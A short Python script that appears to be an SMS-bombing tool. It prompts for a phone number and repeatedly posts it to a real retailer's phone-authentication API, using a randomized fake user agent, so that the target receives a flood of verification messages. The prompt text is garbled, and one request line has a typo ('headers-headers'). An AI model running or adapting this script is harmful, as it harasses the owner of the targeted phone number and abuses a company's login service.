import requests, fake_useragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('Beeante HOMep tenedona: (6es +)')



while True:

 try:
     print('data+')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Data+')
     
 try:
     print('data-')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers-headers, data={'phone' : NUMBER})
 except:
     print('Data-')
     
 try:
     print('json+')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Json+')
     
 try:
     print('json-')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Json-')
     time.sleep(5000)